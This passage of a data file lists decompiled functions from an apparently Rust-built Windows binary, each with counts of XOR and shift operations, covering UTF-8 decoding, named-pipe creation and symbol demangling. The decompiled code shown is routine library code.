)\n      {\n        v9 = (char *)(*(_QWORD *)pbBuffer + 1i64);\nLABEL_19:\n        v16 = 1i64;\n        v10 = 0;\nLABEL_20:\n        v17 = v7 - v9 + 3;\n        if ( (unsigned __int64)(v7 - v9) >= 0xFFFFFFFFFFFFFFFDui64 )\n          v17 = -1i64;\n        v12 = v16 + (v17 >> 2);\n        v11 = 1;\n        goto LABEL_23;\n      }\n      v13 = v8 & 0x1F;\n      v14 = *(_BYTE *)(*(_QWORD *)pbBuffer + 1i64) & 0x3F;\n      if ( (unsigned __int8)v8 <= 0xDFu )\n      {\n        v9 = (char *)(*(_QWORD *)pbBuffer + 2i64);\n        LOWORD(v8) = v14 | ((_WORD)v13 << 6);\n        goto LABEL_19;\n      }\n      v15 = (v14 << 6) | *(_BYTE *)(*(_QWORD *)pbBuffer + 2i64) & 0x3F;\n      if ( **(_BYTE **)pbBuffer < 0xF0u )\n      {\n        v9 = (char *)(*(_QWORD *)pbBuffer + 3i64);\n        v8 = (v13 << 12) | v15;\n        if ( v8 <= 0xFFFF )\n          goto LABEL_19;\n      }\n      else\n      {\n        v9 = (char *)(*(_QWORD *)pbBuffer + 4i64);\n        v8 = ((v13 & 7) << 18) | (v15 << 6) | *(_BYTE *)(*(_QWORD *)pbBuffer + 3i64) & 0x3F;\n        if ( v8 <= 0xFFFF )\n          goto LABEL_19;\n      }\n      v16 = 2i64;\n      v10 = v8 & 0x3FF | 0xDC00;\n      LOWORD(v8) = ((v8 + 16711680) >> 10) | 0xD800;\n      goto LABEL_20;\n    }\n    v10 = 0;\n    v11 = 0;\n    LOWORD(v8) = 0;\n    v9 = 0i64;\n    v12 = 0i64;\nLABEL_23:\n    if ( v12 < 4 )\n      v12 = 3i64;\n    if ( v12 >= 0x3FFFFFFFFFFFFFFFi64 )\n    {\n      v65 = 1;\n      v64 = 1;\n      sub_140001620();\n    }\n    v18 = v12 + 1;\n    v19 = (WCHAR *)sub_140001540(2 * v18, 2ui64);\n    if ( !v19 )\n    {\n      v65 = 1;\n      v64 = 1;\n      sub_14005DBB0(2i64, 2 * v18);\n    }\n    v20 = v19;\n    v55 = v46 + 1;\n    *v19 = v8;\n    v21 = 1i64;\n    lpName = v19;\n    while ( 1 )\n    {\n      if ( v9 )\n      {\n        if ( v10 )\n        {\n          v22 = 0;\n          LOWORD(v23) = v10;\nLABEL_33:\n          if ( v21 != v18 )\n          {\n            v10 = v22;\n            goto LABEL_29;\n          }\n          v62 = v18;\n          v24 = v7 - v9 + 3;\n          if ( (unsigned __int64)(v7 - v9) >= 0xFFFFFFFFFFFFFFFDui64 )\n            v24 = -1i64;\n          v25 = (v24 >> 2) - ((v22 == 0) - 1i64) - ((v11 == 0) - 1i64);\n          v10 = v22;\n          goto LABEL_42;\n        }\n        if ( v9 != v7 )\n        {\n          LOWORD(v23) = (unsigned __int8)*v9;\n          if ( *v9 >= 0 )\n          {\n            ++v9;\n            v22 = 0;\n            goto LABEL_33;\n          }\n          v30 = v23 & 0x1F;\n          v31 = v9[1] & 0x3F;\n          if ( (unsigned __int8)v23 <= 0xDFu )\n          {\n            v9 += 2;\n            LOWORD(v23) = v31 | ((_WORD)v30 << 6);\n            v22 = 0;\n            goto LABEL_33;\n          }\n          v32 = (v31 << 6) | v9[2] & 0x3F;\n          if ( (unsigned __int8)*v9 < 0xF0u )\n          {\n            v9 += 3;\n            v23 = (v30 << 12) | v32;\n            if ( v23 <= 0xFFFF )\n              goto LABEL_58;\n          }\n          else\n          {\n            v33 = v9[3];\n            v9 += 4;\n            v23 = ((v30 & 7) << 18) | (v32 << 6) | v33 & 0x3F;\n            if ( v23 <= 0xFFFF )\n            {\nLABEL_58:\n              v22 = 0;\n              goto LABEL_33;\n            }\n          }\n          v22 = v23 & 0x3FF | 0xDC00;\n          LOWORD(v23) = ((v23 + 16711680) >> 10) | 0xD800;\n          goto LABEL_33;\n        }\n      }\n      v62 = v18;\n      if ( v11 != 1 )\n        break;\n      v9 = 0i64;\n      v11 = 0;\n      LOWORD(v23) = 0;\n      v25 = 0i64;\n      if ( v21 != v62 )\n      {\n        v18 = v62;\n        LOWORD(v23) = 0;\n        goto LABEL_29;\n      }\nLABEL_42:\n      v26 = v25 + 1;\n      v27 = __CFADD__(v21, v26);\n      v18 = v21 + v26;\n      if ( v27 )\n        goto LABEL_87;\n      if ( 2 * v62 > v18 )\n        v18 = 2 * v62;\n      if ( v18 < 5 )\n        v18 = 4i64;\n      v28 = 0i64;\n      if ( v62 )\n      {\n        *(_QWORD *)pbBuffer = lpName;\n        *(_QWORD *)&v59 = 2 * v62;\n        v29 = 2i64;\n      }\n      else\n      {\n        v29 = 0i64;\n      }\n      LOBYTE(v28) = v18 >> 62 == 0;\n      *(_QWORD *)&pbBuffer[8] = v29;\n      sub_14002C930((__int64 *)&p_CurrentProcessId, 2 * v28, 2 * v18, (__int64)pbBuffer);\n      v20 = (LPCWSTR)v48;\n      if ( p_CurrentProcessId )\n      {\n        if ( v48 != (__int64 (__fastcall *)(unsigned int *, __int64))0x8000000000000001i64 )\n        {\n          if ( v48 )\n            sub_14005DBB0((__int64)v48, (__int64)v49);\nLABEL_87:\n          sub_140001620();\n        }\n        v18 = v62;\n        v20 = lpName;\n      }\n      else\n      {\n        lpName = (LPCWSTR)v48;\n      }\nLABEL_29:\n      v20[v21++] = v23;\n    }\n    v3 = dwPipeMode;\n    NamedPipeW = CreateNamedPipeW(lpName, dwOpenMode, dwPipeMode, 1u, 0x10000u, 0x10000u, 0, 0i64);\n    if ( NamedPipeW == (HANDLE)-1i64 )\n    {\n      LODWORD(v35) = GetLastError();\n      v36 = (v35 << 32) | 2;\n      if ( (int)v55 <= 9 )\n      {\n        if ( (_DWORD)v35 == 5 )\n        {\n          v46 = v55;\n          v5 = BCryptGenRandom;\nLABEL_68:\n          v2 = 1;\n          v4 = 0;\n          if ( v62 )\n          {\n            sub_1400015D0((void *)lpName, 2ui64);\n            v4 = 0;\n          }\n          continue;\n        }\n        v5 = BCryptGenRandom;\n        if ( v3 )\n        {\n          v3 = 0;\n          if ( (_DWORD)v35 == 87 )\n            goto LABEL_68;\n        }\n      }\n      v37 = v57;\n      v57[1] = v36;\n      *v37 = 1i64;\n      v38 = -1i64;\n      if ( v62 )\n        LODWORD(v37) = sub_1400015D0((void *)lpName, 2ui64);\n      if ( *((_QWORD *)&v51 + 1) )\nLABEL_75:\n        LODWORD(v37) = sub_1400015D0((void *)v51, 1ui64);\nLABEL_76:\n      if ( NamedPipeW != (HANDLE)-1i64 )\n        LODWORD(v37) = CloseHandle((HANDLE)v38);\n    }\n    else\n    {\n      if ( v62 )\n        sub_1400015D0((void *)lpName, 2ui64);\n      *(_DWORD *)pbBuffer = 0;\n      *(_DWORD *)((char *)&v60 + 2) = 0;\n      BYTE1(v60) = v63;\n      LOBYTE(v60) = v63 ^ 1;\n      v59 = 0i64;\n      LODWORD(p_CurrentProcessId) = 24;\n      v48 = 0i64;\n      LODWORD(v49) = 1;\n      *(_QWORD *)&pbBuffer[8] = &p_CurrentProcessId;\n      v39 = (void *)v51;\n      v44 = NamedPipeW;\n      v65 = 1;\n      v64 = 0;\n      if ( sub_140034B90((char *)v51, v52, (__int64)pbBuffer) )\n      {\n        v37 = v57;\n        v57[1] = v40;\n        *v37 = 1i64;\n        v38 = (__int64)NamedPipeW;\n        if ( *((_QWORD *)&v51 + 1) )\n          goto LABEL_75;\n        goto LABEL_76;\n      }\n      v37 = v57;\n      v57[1] = NamedPipeW;\n      v37[2] = v40;\n      *v37 = 0i64;\n      if ( *((_QWORD *)&v51 + 1) )\n        LODWORD(v37) = sub_1400015D0(v39, 1ui64);\n    }\n    return (int)v37;\n  }\n}\n// 140042E30: variable 'v35' is possibly undefined\n// 140042FCD: variable 'v40' is possibly undefined\n// 14006C678: using guessed type char *off_14006C678;\n// 140087C30: using guessed type __int64 qword_140087C30;\n\n"
    },
    {
        "Function": "sub_1400212C0",
        "Total XOR and shift operations": 27,
        "XOR operations": 1,
        "Shift operations": 26,
        "Operation percentage": "3.69%",
        "Function Body": "\n__int64 __fastcall sub_1400212C0(char ***a1, __int64 a2)\n{\n  int v2; // r15d\n  __int64 v3; // rsi\n  char **v4; // rax\n  char *v5; // r13\n  unsigned __int64 v6; // rdx\n  __int64 v7; // r12\n  char v8; // al\n  __int64 v9; // r14\n  int v10; // ecx\n  __int64 v11; // rax\n  unsigned __int64 v12; // rdi\n  int v13; // r10d\n  int v14; // r9d\n  int v15; // r8d\n  char *v16; // rbp\n  unsigned __int64 v17; // r9\n  unsigned __int64 v18; // rbx\n  __int64 v19; // rcx\n  char *v20; // rax\n  __int64 v21; // rcx\n  int v22; // edx\n  int v23; // r8d\n  int v24; // r11d\n  int v25; // r9d\n  char *v26; // r12\n  unsigned __int64 v27; // r14\n  int v28; // eax\n  char v29; // cl\n  unsigned int v30; // eax\n  unsigned __int8 *v31; // rax\n  unsigned __int64 v32; // r8\n  char *v33; // rcx\n  unsigned __int8 *v34; // r9\n  unsigned __int64 v35; // rbx\n  int v36; // edx\n  int v37; // r8d\n  int v38; // r11d\n  int v39; // r10d\n  unsigned __int64 v40; // rdi\n  __int64 v41; // rax\n  char *v42; // r12\n  char *v43; // rdi\n  unsigned __int64 v44; // r9\n  unsigned __int64 v45; // rbp\n  char *v46; // rax\n  unsigned __int64 v47; // rdx\n  int v48; // ecx\n  char *v49; // rax\n  unsigned __int8 *v50; // rax\n  char *v51; // r8\n  int v52; // r9d\n  int v53; // r10d\n  int v54; // r11d\n  char v55; // cl\n  int v56; // r8d\n  int v57; // eax\n  int v58; // r8d\n  int v59; // edx\n  __int64 v60; // r9\n  unsigned int v61; // r8d\n  int v62; // r10d\n  unsigned int v63; // r11d\n  int v64; // r10d\n  bool v65; // cf\n  unsigned int v66; // r10d\n  int v67; // r10d\n  unsigned int v68; // r11d\n  int v69; // r10d\n  unsigned int v70; // r10d\n  char **v72; // rax\n  char **v73; // rax\n  unsigned int v74; // [rsp+34h] [rbp-A4h]\n  unsigned __int64 v75; // [rsp+38h] [rbp-A0h]\n  __int64 v76; // [rsp+40h] [rbp-98h]\n  __int128 v77; // [rsp+48h] [rbp-90h] BYREF\n  __int64 v78; // [rsp+58h] [rbp-80h]\n  __int64 v79; // [rsp+60h] [rbp-78h]\n  __int64 v80; // [rsp+68h] [rbp-70h]\n  __int64 v81; // [rsp+70h] [rbp-68h]\n  __int64 v82; // [rsp+78h] [rbp-60h]\n  __int64 v83; // [rsp+80h] [rbp-58h] BYREF\n  unsigned __int64 v84; // [rsp+88h] [rbp-50h]\n\n  v3 = a2;\n  v4 = *a1;\n  v5 = **a1;\n  if ( !v5 )\n  {\n    v77 = *(_OWORD *)(v4 + 1);\n    v78 = 0i64;\n    LODWORD(v79) = 0;\n    v80 = a2;\n    LODWORD(v81) = 0;\n    LOBYTE(a2) = 1;\n    LOBYTE(v30) = sub_14001B970((__int64)&v77, a2);\n    return v30;\n  }\n  v6 = (unsigned __int64)v4[1];\n  v7 = (__int64)v4[2];\n  v76 = 0i64;\n  v82 = v7;\n  while ( 1 )\n  {\n    v9 = v76;\n    LOBYTE(v2) = v76 != v7;\n    v74 = v2;\n    if ( v76 == v7 )\n      return v74;\n    if ( !v6 )\n      goto LABEL_191;\n    ++v76;\n    LOBYTE(v10) = *v5;\n    v11 = 0i64;\n    v12 = v6;\n    if ( *v5 < 0 )\n    {\nLABEL_11:\n      v13 = v10 & 0x1F;\n      v14 = v5[v11 + 1] & 0x3F;\n      if ( (unsigned __int8)v10 <= 0xDFu )\n      {\n        v10 = v14 | (v13 << 6);\n        goto LABEL_18;\n      }\n      v15 = (v14 << 6) | v5[v11 + 2] & 0x3F;\n      if ( (unsigned __int8)v10 < 0xF0u )\n      {\n        v10 = (v13 << 12) | v15;\n        goto LABEL_18;\n      }\n      v10 = ((v10 & 7) << 18) | (v15 << 6) | v5[v11 + 3] & 0x3F;\n      if ( v10 != 1114112 )\n        goto LABEL_18;\nLABEL_191:\n      sub_14005DEC0(\n        (__int64)\"called `Option::unwrap()` on a `None` valueC:\\\\Users\\\\root\\\\.cargo\\\\registry\\\\src\\\\index.crates.io-6f17\"\n                 \"d22bba15001f\\\\winapi-util-0.1.5\\\\src\\\\win.rs\",\n        43i64,\n        (__int64)&off_140068528);\n    }\n    while ( 1 )\n    {\n      v10 = (unsigned __int8)v10;\nLABEL_18:\n      v16 = &v5[v11];\n      if ( (unsigned int)(v10 - 48) > 9 )\n        break;\n      if ( v12 < 2 )\n        goto LABEL_191;\n      LOBYTE(v10) = v5[v11 + 1];\n      if ( (char)v10 <= -65 )\n        sub_14005E370(v16, v12, 1ui64, v12, (__int64)&off_140068540);\n      --v12;\n      ++v11;\n      if ( (v10 & 0x80u) != 0 )\n        goto LABEL_11;\n    }\n    v17 = v6 - v12;\n    if ( v6 != v12 && (v6 < v12 || v5[v17] <= -65) )\n      sub_14005E370(v5, v6, 0i64, v17, (__int64)&off_140068558);\n    sub_140008150((__int64)&v77, (unsigned __int8 *)v5, v17);\n    if ( (_BYTE)v77 )\n    {\n      LOBYTE(v83) = BYTE1(v77);\n      sub_14005E190(\n        (__int64)\"called `Result::unwrap()` on an `Err` value\",\n        43i64,\n        (__int64)&v83,\n        (__int64)&off_1400683E8,\n        (__int64)&off_140068570);\n    }\n    v18 = *((_QWORD *)&v77 + 1);\n    if ( *((_QWORD *)&v77 + 1) )\n    {\n      v75 = v12 - *((_QWORD *)&v77 + 1);\n      if ( v12 <= *((_QWORD *)&v77 + 1) )\n      {\n        if ( v12 != *((_QWORD *)&v77 + 1) )\nLABEL_197:\n          sub_14005E370(v16, v12, *((unsigned __int64 *)&v77 + 1), v12, (__int64)&off_140068588);\n        v75 = 0i64;\n      }\n      else if ( v16[*((_QWORD *)&v77 + 1)] <= -65 )\n      {\n        goto LABEL_197;\n      }\n      v5 = &v16[*((_QWORD *)&v77 + 1)];\n      if ( v76 == v7 && (*(_DWORD *)(v3 + 52) & 4) != 0 && *v16 == 104 )\n      {\n        if ( *((_QWORD *)&v77 + 1) < 2ui64 )\n        {\n          v19 = 0i64;\n        }\n        else\n        {\n          if ( v16[1] <= -65 )\n          {\n            v73 = &off_140068510;\n            goto LABEL_208;\n          }\n          v19 = *((_QWORD *)&v77 + 1) - 1i64;\n        }\n        v20 = v16 + 1;\n        v21 = (__int64)&v16[v19 + 1];\n        do\n        {\n          if ( v20 == (char *)v21 )\n            return 0;\n          v22 = (unsigned __int8)*v20;\n          if ( *v20 < 0 )\n          {\n            v23 = v22 & 0x1F;\n            v24 = v20[1] & 0x3F;\n            if ( (unsigned __int8)v22 <= 0xDFu )\n            {\n              v20 += 2;\n              v22 = v24 | (v23 << 6);\n            }\n            else\n            {\n              v25 = (v24 << 6) | v20[2] & 0x3F;\n              if ( (unsigned __int8)*v20 < 0xF0u )\n              {\n                v20 += 3;\n                v22 = (v23 << 12) | v25;\n              }\n              else\n              {\n                v22 = ((v22 & 7) << 18) | (v25 << 6) | v20[3] & 0x3F;\n                if ( v22 == 1114112 )\n                  return 0;\n                v20 += 4;\n              }\n            }\n          }\n          else\n          {\n            ++v20;\n          }\n        }\n        while ( (unsigned int)(v22 - 48) < 0xA || (v22 | 0x20u) - 97 < 6 );\n      }\n    }\n    else\n    {\n      v5 = v16;\n      v75 = v12;\n    }\n    if ( v9\n      && (*(unsigned __int8 (__fastcall **)(_QWORD, unsigned __int16 *, __int64))(*(_QWORD *)(v3 + 40) + 24i64))(\n           *(_QWORD *)(v3 + 32),\n           word_1400685A0,\n           2i64) )\n    {\n      return v74;\n    }\n    if ( v18 >= 2 && *(_WORD *)v16 == 9311 )\n    {\n      if ( v16[1] > -65 )\n      {\n        ++v16;\n        --v18;\n        goto LABEL_55;\n      }\n      v73 = &off_1400685A8;\nLABEL_208:\n      sub_14005E370(v16, v18, 1ui64, v18, (__int64)v73);\n    }\nLABEL_55:\n    v26 = v16;\n    v27 = v18;\n    if ( !v18 )\n      goto LABEL_66;\n    v28 = (unsigned __int8)*v16;\n    if ( v28 != 36 )\n      break;\n    if ( v18 < 2 )\n    {\n      v41 = 0i64;\n    }\n    else\n    {\n      if ( v16[1] <= -65 )\n      {\n        v72 = &off_1400685F0;\n        goto LABEL_206;\n      }\n      v41 = v18 - 1;\n    }\n    v43 = v16 + 1;\n    *(_QWORD *)&v77 = v16 + 1;\n    *((_QWORD *)&v77 + 1) = v41;\n    v78 = 0i64;\n    v79 = v41;\n    v80 = 1i64;\n    v81 = 0x2400000024i64;\n    sub_14001B760(&v83, (__int64 *)&v77);\n    if ( !v83 )\n      goto LABEL_3;\n    if ( v84 == -1i64 )\n      sub_14005E410();\n    v44 = v84 + 1;\n    if ( v18 >= 2 && *v43 < -64 )\nLABEL_195:\n      sub_14005E370(v16, v18, 1ui64, v44, (__int64)&off_140068608);\n    if ( v44 >= v18 )\n    {\n      if ( v44 != v18 )\n        goto LABEL_195;\n      v46 = v16;\n      v45 = v84 + 2;\n      if ( v84 == -2i64 )\n        goto LABEL_115;\n    }\n    else\n    {\n      if ( v16[v44] < -64 )\n        goto LABEL_195;\n      v45 = v84 + 2;\n    }\n    v18 -= v45;\n    if ( v27 <= v45 )\n    {\n      if ( v27 != v45 )\nLABEL_199:\n        sub_14005E370(v26, v27, v45, v27, (__int64)&off_140068620);\n    }\n    else if ( v26[v45] < -64 )\n    {\n      goto LABEL_199;\n    }\n    v16 = &v26[v45];\n    if ( v84 == 1 )\n    {\n      v48 = (unsigned __int8)*v43;\n      v49 = \",><&@\";\n      if ( v48 == 67 )\n        goto LABEL_149;\n      if ( v48 != 117 )\n        goto LABEL_3;\n      v47 = 0i64;\n      goto LABEL_121;\n    }\n    if ( v84 != 2 )\n    {\n      v46 = v16;\n      if ( !v84 )\n        goto LABEL_3;\nLABEL_115:\n      v16 = v46;\n      if ( v26[1] != 117 )\n        goto LABEL_3;\nLABEL_116:\n      if ( v26[2] <= -65 )\n        sub_14005E370(v26 + 1, v84, 1ui64, v84, (__int64)&off_140068640);\n      v47 = v84 - 1;\nLABEL_121:\n      v50 = (unsigned __int8 *)(v26 + 2);\n      v51 = v26 + 2;\n      do\n      {\n        if ( v51 == &v26[v47 + 2] )\n        {\nLABEL_135:\n          v55 = 0;\n          if ( !v47 )\n            goto LABEL_3;\n          goto LABEL_136;\n        }\n        v52 = (unsigned __int8)*v51;\n        if ( *v51 < 0 )\n        {\n          v53 = v52 & 0x1F;\n          v2 = v51[1] & 0x3F;\n          if ( (unsigned __int8)v52 <= 0xDFu )\n          {\n            v51 += 2;\n            v52 = v2 | (v53 << 6);\n          }\n          else\n          {\n            v2 <<= 6;\n            v54 = v2 | v51[2] & 0x3F;\n            if ( (unsigned __int8)*v51 < 0xF0u )\n            {\n              v51 += 3;\n              v52 = (v53 << 12) | v54;\n            }\n            else\n            {\n              v52 = ((v52 & 7) << 18) | (v54 << 6) | v51[3] & 0x3F;\n              if ( v52 == 1114112 )\n                goto LABEL_135;\n              v51 += 4;\n            }\n          }\n        }\n        else\n        {\n          ++v51;\n        }\n      }\n      while ( (unsigned int)(v52 - 48) < 0xA || (unsigned int)(v52 - 97) < 6 );\n      v55 = 1;\n      if ( !v47 )\n        goto LABEL_3;\nLABEL_136:\n      v56 = *v50;\n      if ( v56 == 45 )\n      {\n        if ( v47 == 1 )\n          goto LABEL_3;\n      }\n      else if ( v56 == 43 )\n      {\n        if ( !--v47 )\n          goto LABEL_3;\n        v50 = (unsigned __int8 *)(v26 + 3);\n      }\n      v60 = 0i64;\n      v61 = 0;\n      if ( v47 < 9 )\n      {\n        do\n        {\n          v67 = v50[v60];\n          v68 = v67 - 48;\n          if ( (unsigned int)(v67 - 48) >= 0xA )\n          {\n            v69 = (v67 | 0x20) - 97;\n            v65 = __CFADD__(v69, 10);\n            v70 = v69 + 10;\n            if ( v65 )\n              v70 = -1;\n            v68 = v70;\n            if ( v70 > 0xF )\n              goto LABEL_3;\n          }\n          v61 = v68 | (16 * v61);\n          ++v60;\n        }\n        while ( v47 != v60 );\nLABEL_162:\n        if ( (v61 ^ 0xD800) - 1114112 < 0xFFEF0800 )\n          v61 = 1114112;\n        if ( !((v61 == 1114112) | (unsigned __int8)v55) )\n        {\n          LODWORD(v77) = v61;\n          if ( v61 << 11 >= 0x88050000 )\n            sub_14005DDC0(1i64, 1i64, (__int64)&off_140062EA8);\n          if ( v61 >= 0x20 && v61 - 127 >= 0x21 )\n          {\n            LOBYTE(v30) = sub_1400059F0((unsigned int *)&v77, (__int64 *)v3);\nLABEL_169:\n            if ( !(_BYTE)v30 )\n              goto LABEL_55;\n            goto LABEL_188;\n          }\n        }\n      }\n      else\n      {\n        while ( 1 )\n        {\n          v62 = v50[v60];\n          v63 = v62 - 48;\n          if ( (unsigned int)(v62 - 48) >= 0xA )\n          {\n            v64 = (v62 | 0x20) - 97;\n            v65 = __CFADD__(v64, 10);\n            v66 = v64 + 10;\n            if ( v65 )\n              v66 = -1;\n            v63 = v66;\n            if ( v66 > 0xF )\n              break;\n          }\n          if ( v61 > 0xFFFFFFF )\n            break;\n          v61 = v63 | (16 * v61);\n          if ( v47 == ++v60 )\n            goto LABEL_162;\n        }\n      }\n      goto LABEL_3;\n    }\n    v49 = \"@\";\n    if ( *(_WORD *)v43 == 20563\n      || (v49 = \"*fatal runtime error: I/O error: operation failed to complete synchronously\\n\", *(_WORD *)v43 == 20546)\n      || (v49 = \"&@\", *(_WORD *)v43 == 18002)\n      || (v49 = \"<&@\", *(_WORD *)v43 == 21580)\n      || (v49 = \"><&@\", *(_WORD *)v43 == 21575)\n      || (v49 = (char *)&unk_140069800, *(_WORD *)v43 == 20556)\n      || (v49 = \")\", *(_WORD *)v43 == 20562) )\n    {\nLABEL_149:\n      v30 = (*(__int64 (__fastcall **)(_QWORD, char *, __int64))(*(_QWORD *)(v3 + 40) + 24i64))(\n              *(_QWORD *)(v3 + 32),\n              v49,\n              1i64);\n      goto LABEL_169;\n    }\n    if ( *v43 == 117 )\n      goto LABEL_116;\nLABEL_3:\n    v8 = (*(__int64 (__fastcall **)(_QWORD, char *, unsigned __int64))(*(_QWORD *)(v3 + 40) + 24i64))(\n           *(_QWORD *)(v3 + 32),\n           v26,\n           v27);\n    v7 = v82;\n    v6 = v75;\n    if ( v8 )\n      return v74;\n  }\n  if ( v28 != 46 )\n  {\nLABEL_66:\n    v31 = (unsigned __int8 *)&v16[v18];\n    v32 = 0i64;\n    v33 = v16;\n    while ( 1 )\n    {\n      if ( v33 == (char *)v31 )\n        goto LABEL_3;\n      v35 = v32;\n      v36 = (unsigned __int8)*v33;\n      if ( *v33 >= 0 )\n      {\n        v34 = (unsigned __int8 *)(v33 + 1);\n        if ( v36 == 36 )\n          goto LABEL_79;\n      }\n      else\n      {\n        v37 = v36 & 0x1F;\n        v38 = v33[1] & 0x3F;\n        if ( (unsigned __int8)v36 <= 0xDFu )\n        {\n          v34 = (unsigned __int8 *)(v33 + 2);\n          v36 = v38 | (v37 << 6);\n          if ( v36 == 36 )\n            goto LABEL_79;\n        }\n        else\n        {\n          v39 = (v38 << 6) | v33[2] & 0x3F;\n          if ( (unsigned __int8)*v33 < 0xF0u )\n          {\n            v34 = (unsigned __int8 *)(v33 + 3);\n            v36 = (v37 << 12) | v39;\n            if ( v36 == 36 )\n              goto LABEL_79;\n          }\n          else\n          {\n            v36 = ((v36 & 7) << 18) | (v39 << 6) | v33[3] & 0x3F;\n            if ( v36 == 1114112 )\n              goto LABEL_3;\n            v34 = (unsigned __int8 *)(v33 + 4);\n            if ( v36 == 36 )\n            {\nLABEL_79:\n              if ( !v35 )\n              {\n                v30 = (*(__int64 (__fastcall **)(_QWORD, char *, _QWORD, unsigned __int8 *))(*(_QWORD *)(v3 + 40) + 24i64))(\n                        *(_QWORD *)(v3 + 32),\n                        v16,\n                        0i64,\n                        v34);\n                v35 = 0i64;\n                if ( !(_BYTE)v30 )\n                  goto LABEL_95;\n                goto LABEL_188;\n              }\n              v40 = v27 - v35;\n              if ( v27 <= v35 )\n              {\n                if ( v27 != v35 || !v16 )\nLABEL_196:\n                  sub_14005E370(v16, v27, 0i64, v35, (__int64)&off_1400685C0);\n                v30 = (*(__int64 (__fastcall **)(_QWORD, char *, unsigned __int64, unsigned __int8 *))(*(_QWORD *)(v3 + 40) + 24i64))(\n                        *(_QWORD *)(v3 + 32),\n                        v16,\n                        v27,\n                        v34);\n                if ( !(_BYTE)v30 )\n                {\n                  v35 = v27;\n                  goto LABEL_94;\n                }\n                goto LABEL_188;\n              }\n              if ( v16[v35] <= -65 )\n                goto LABEL_196;\n              v30 = (*(__int64 (__fastcall **)(_QWORD, char *, unsigned __int64, unsigned __int8 *))(*(_QWORD *)(v3 + 40) + 24i64))(\n                      *(_QWORD *)(v3 + 32),\n                      v16,\n                      v35,\n                      v34);\n              if ( (_BYTE)v30 )\n                goto LABEL_188;\n              if ( v16[v35] < -64 )\n                sub_14005E370(v16, v27, v35, v27, (__int64)&off_1400685D8);\nLABEL_94:\n              v27 = v40;\nLABEL_95:\n              v42 = &v16[v35];\n              v18 = v27;\n              v16 = v42;\n              goto LABEL_55;\n            }\n          }\n        }\n      }\n      v32 = (unsigned __int64)&v34[v35 - (_QWORD)v33];\n      v33 = (char *)v34;\n      if ( v36 == 46 )\n        goto LABEL_79;\n    }\n  }\n  if ( v18 < 2 )\n  {\n    v30 = (*(__int64 (__fastcall **)(_QWORD, char *, __int64))(*(_QWORD *)(v3 + 40) + 24i64))(\n            *(_QWORD *)(v3 + 32),\n            \".\",\n            1i64);\n    if ( !(_BYTE)v30 )\n    {\n      v18 = 0i64;\nLABEL_183:\n      ++v16;\n      goto LABEL_55;\n    }\n    goto LABEL_188;\n  }\n  v29 = v16[1];\n  if ( v29 <= -65 )\n  {\n    v72 = &off_140068660;\n    goto LABEL_206;\n  }\n  if ( v29 >= 0 )\n  {\n    if ( v29 != 46 )\n      goto LABEL_180;\n    goto LABEL_62;\n  }\n  v57 = v29 & 0x1F;\n  v58 = v16[2] & 0x3F;\n  if ( (unsigned __int8)v29 <= 0xDFu )\n  {\n    if ( (v58 | (v57 << 6)) != 46 )\n      goto LABEL_180;\n    goto LABEL_62;\n  }\n  v59 = (v58 << 6) | v16[3] & 0x3F;\n  if ( (unsigned __int8)v29 >= 0xF0u )\n  {\n    if ( ((v59 << 6) | v16[4] & 0x3F | ((v29 & 7) << 18)) != 46 )\n      goto LABEL_180;\n    goto LABEL_62;\n  }\n  if ( (v59 | (v57 << 12)) == 46 )\n  {\nLABEL_62:\n    v30 = (*(__int64 (__fastcall **)(_QWORD, unsigned __int16 *, __int64))(*(_QWORD *)(v3 + 40) + 24i64))(\n            *(_QWORD *)(v3 + 32),\n            word_1400685A0,\n            2i64);\n    if ( (_BYTE)v30 )\n      goto LABEL_188;\n    if ( v18 < 3 )\n    {\n      v18 = 0i64;\n    }\n    else\n    {\n      if ( v16[2] < -64 )\n        sub_14005E370(v16, v18, 2ui64, v18, (__int64)&off_140068678);\n      v18 -= 2i64;\n    }\n    v16 += 2;\n    goto LABEL_55;\n  }\nLABEL_180:\n  v30 = (*(__int64 (__fastcall **)(_QWORD, char *, __int64))(*(_QWORD *)(v3 + 40) + 24i64))(\n          *(_QWORD *)(v3 + 32),\n          \".\",\n          1i64);\n  if ( !(_BYTE)v30 )\n  {\n    if ( v16[1] >= -64 )\n    {\n      --v18;\n      goto LABEL_183;\n    }\n    v72 = &off_140068690;\nLABEL_206:\n    sub_14005E370(v16, v18, 1ui64, v18, (__int64)v72);\n  }\nLABEL_188:\n  LOBYTE(v30) = 1;\n  return v30;\n}\n// 140021BA3: conditional instruction was optimized away because rdx.8>=9u\n// 14002132F: variable 'v2' is possibly undefined\n// 140021D5D: variable 'v30' is possibly undefined\n// 140062EA8: using guessed type char *off_140062EA8;\n// 1400683E8: using guessed type __int64 (__fastcall *off_1400683E8)();\n// 140068510: using guessed type char *off_140068510;\n// 140068528: using guessed type char *off_140068528;\n// 140068540: using guessed type char *off_140068540;\n// 140068558: using guessed type char *off_140068558;\n// 140068570: using guessed type char *off_140068570;\n// 140068588: using guessed type char *off_140068588;\n// 1400685A0: using guessed type unsigned __int16 word_1400685A0[4];\n// 1400685A8: using guessed type char *off_1400685A8;\n// 1400685C0: using guessed type char *off_1400685C0;\n// 1400685D8: using guessed type char *off_1400685D8;\n// 1400685F0: using guessed type char *off_1400685F0;\n// 140068608: using guessed type char *off_140068608;\n// 140068620: using guessed type char *off_140068620;\n// 140068640: using guessed type char *off_140068640;\n// 140068660: using guessed type char *off_140068660;\n// 140068678: using guessed type char *off_140068678;\n// 140068690: using guessed type char *off_140068690;\n\n"
    },
    {
        "Function": "sub_14003A840",
        "Total XOR and shift operations": 40,
        "XOR operations": 1,
        "Shift operations": 39,
        "Operation percentage": "1.51%",
